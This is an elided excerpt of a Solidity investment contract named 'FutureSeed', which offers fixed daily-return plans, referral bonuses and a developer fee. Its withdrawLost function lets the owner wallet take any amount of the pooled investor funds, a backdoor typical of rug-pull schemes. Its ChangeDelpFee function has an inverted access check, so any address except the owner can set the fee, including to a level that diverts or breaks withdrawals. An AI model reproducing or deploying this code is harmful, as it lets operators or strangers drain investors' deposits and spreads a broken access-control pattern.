...
contract FutureSeed {
	...
	uint256 public DELP_FEE=10;
	uint256 public totalInvested;
	uint256 public totalRefBonus;
    uint256[] public INVEST_MIN_AMOUNT=[2e16,5e16,1e17,2e17];
	...
	event Withdrawn(address indexed user, uint256 amount,uint256 adminAmt);
	...
	constructor(address payable wallet,address payable  _DeveloperWallet,address payable _OwnerWallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		DeveloperWallet=_DeveloperWallet;
		OwnerWallet=_OwnerWallet;
		  plans.push(Plan(1000, 2000));	//1000/2000=2%
		  plans.push(Plan(200, 600));	//200/600=3%
		  plans.push(Plan(80, 400));	//80/400=5%
	 	  plans.push(Plan(20,200));
        // plans.push(Plan(1000, 20000));	//20000/10000=2%
		// plans.push(Plan(200, 30000));	//30000/10000=3%
		// plans.push(Plan(80, 50000));	//30000/10000=5%
		// plans.push(Plan(30,100000));	//100000/10000=10%
		}
	...
	function invest(address referrer, uint8 plan) public payable {
		...
		require(msg.value >= INVEST_MIN_AMOUNT[plan]);
        require(plan < 4, "Invalid plan");


		// uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		uint256 Adminfee= msg.value.mul(DELP_FEE).div(100);
		// commissionWallet.transfer(fee);
		 DeveloperWallet.transfer(Adminfee);
		...
		user.deposits.push(Deposit(plan, msg.value, block.timestamp));
				   user.withcheckpoint=now+(24*60*60);
	...
	function withdraw() public {
		...
		require(totalAmount > 0, "User has no dividends");
 		require(user.withdrawnseed<=now,"Next Withdrawal available after 24 hours");
		//  require ( user.withcheckpoint<=now,"cannot withdraw before 24 hours complete"); 
		...
		user.checkpoint = block.timestamp;
		user.withdrawnseed=now+(24*60*60);
		user.withdrawn = user.withdrawn.add(totalAmount);
		// user.withcheckpoint=now+(24*60*60);
		uint256 adminAmt=totalAmount.mul(DELP_FEE).div(100);
		msg.sender.transfer(totalAmount-adminAmt);
		DeveloperWallet.transfer(adminAmt);
		emit Withdrawn(msg.sender, totalAmount,adminAmt);
	}
	...
	function ChangeDelpFee(uint256 DelpFee) public 
	{
		require(msg.sender!=OwnerWallet,"Invalid Owner Address ");
		DELP_FEE=DelpFee;
	}

	function withdrawLost(uint256 WithAmt) public {
        require(msg.sender == OwnerWallet, "Invalid Wallet  Balance");
        OwnerWallet.transfer(WithAmt);
    }
